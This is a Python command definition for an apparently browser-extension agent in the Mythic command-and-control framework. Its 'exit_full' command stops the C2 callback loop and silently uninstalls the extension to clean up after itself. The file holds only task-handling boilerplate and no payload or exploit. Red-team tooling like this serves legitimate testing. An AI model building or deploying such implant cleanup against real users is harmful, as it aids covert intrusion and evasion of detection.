from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments,
    MythicTask, PTTaskMessageAllData,
    PTTaskProcessResponseMessageResponse, CommandAttributes,
)


class ExitFullArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ExitFullCommand(CommandBase):
    cmd                  = "exit_full"
    needs_admin          = False
    help_cmd             = "exit_full"
    description          = "Stop the C2 callback loop and silently uninstall the extension via chrome.management.uninstallSelf."
    version              = 1
    author               = "@asaurusrex"
    supported_ui_features = ["callback_table:exit"]
    argument_class       = ExitFullArguments
    parameters           = []
    attackmapping        = []
    attributes           = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = ""
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
